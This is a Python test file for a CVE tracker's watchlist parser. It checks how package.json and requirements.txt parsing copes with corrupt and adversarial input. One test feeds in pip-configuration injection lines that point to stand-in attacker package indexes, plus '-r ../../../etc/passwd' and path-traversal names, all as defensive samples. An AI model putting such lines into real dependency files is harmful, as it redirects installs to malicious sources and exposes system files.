"""Tests for WatchlistParser under corrupt, malicious, and adversarial input conditions."""

import json
import pytest

from cve_tracker.models.cve import CVEItem, SourceType
from cve_tracker.models.filter import SubscriptionFilter
from cve_tracker.services.watchlist import WatchlistParser


def test_package_json_corrupt_json_syntax():
    """Verify syntax-corrupted JSON does not crash the parser and returns empty list."""
    corrupted_inputs = [
        "",
        "{",
        "{ dependencies: { 'react': '18' } }",  # invalid unquoted json
        '{"dependencies": {"react": "^18.0.0"',  # truncated
        "\x00\x00\x00\x00",  # null bytes
        "Random plain text instead of JSON",
    ]
    for raw in corrupted_inputs:
        result = WatchlistParser.parse_package_json(raw)
        assert result == []


def test_package_json_abnormal_structures():
    """Verify handling when dependency fields contain abnormal or malicious types."""
    abnormal_payloads = [
        json.dumps([]),  # root is array
        json.dumps({"dependencies": None}),
        json.dumps({"dependencies": ["react", "vue"]}),  # list instead of dict
        json.dumps({"dependencies": 12345}),
        json.dumps({"dependencies": {"react": {"nested": "object"}}}),
    ]
    for raw in abnormal_payloads:
        result = WatchlistParser.parse_package_json(raw)
        assert isinstance(result, list)


def test_package_json_empty_dependency_key_filter_bypass_prevention():
    """Prove that empty string key in package.json is sanitized and does not enter watchlist."""
    malformed_json = json.dumps({
        "dependencies": {
            "": "^1.0.0",  # empty key
            "  ": "^2.0.0",  # whitespace key
            "valid-package": "^1.0.0"
        }
    })
    packages = WatchlistParser.parse_package_json(malformed_json)

    # Empty string MUST NOT be present
    assert "" not in packages
    assert "valid-package" in packages

    # Security invariant: empty string in watchlist must not match arbitrary CVEs
    cve = CVEItem(
        id="CVE-2024-0001",
        source=SourceType.NVD,
        description="Unrelated vulnerability in some proprietary software."
    )
    filt = SubscriptionFilter(watchlist=packages)
    # Should NOT match since CVE does not contain 'valid-package'
    assert filt.matches(cve) is False


def test_requirements_txt_malicious_pip_flags_and_urls():
    """Verify pip flags, options, and remote URLs are stripped without injecting garbage components."""
    malicious_reqs = """
    # Normal package
    cryptography==42.0.5
    
    # Pip configuration injection attempts
    --extra-index-url https://malicious-pypi.attacker.com/simple
    -i http://pypi.evil.org
    --trusted-host malicious.attacker.com
    --find-links /tmp/malicious/wheels
    -r ../../../etc/passwd
    
    # Path traversal names
    ../../../../tmp/relative-pkg
    """
    packages = WatchlistParser.parse_requirements_txt(malicious_reqs)

    assert "cryptography" in packages
    assert "--extra-index-url" not in packages
    assert "-i" not in packages
    assert "https" not in packages
    assert "-r" not in packages


def test_parse_manifest_path_traversal_filenames():
    """Verify path traversal in manifest filename is handled safely."""
    traversal_names = [
        "../../../../package.json",
        "..\\..\\requirements.txt",
        "/etc/passwd",
    ]
    for name in traversal_names:
        result = WatchlistParser.parse_manifest(name, "pydantic>=2.0.0")
        assert "pydantic" in result
